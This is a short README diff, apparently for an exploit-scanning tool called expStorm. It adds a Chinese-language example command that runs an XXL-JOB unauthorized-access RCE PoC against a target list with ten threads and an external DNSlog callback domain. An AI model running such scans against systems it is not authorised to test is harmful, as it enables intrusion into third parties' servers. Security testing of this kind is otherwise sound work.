@@ -24,6 +24,14 @@ def __init__(self):
     }
 ```
 
+例如：探测xxl-job未授权rec漏洞
+
+
+```commandline
+python .\expStorm.py -r .\pocs\web\XXL-JOB\xxl-job-unauth-access.py -f .\target\xxl-job.txt --domain "charis3389.xyz" --threads 10
+```
+
+
 
 ## 更新日志0.1.1
 1. 针对无回显poc验证编写了一个接口，此接口可以使用自建dnslog
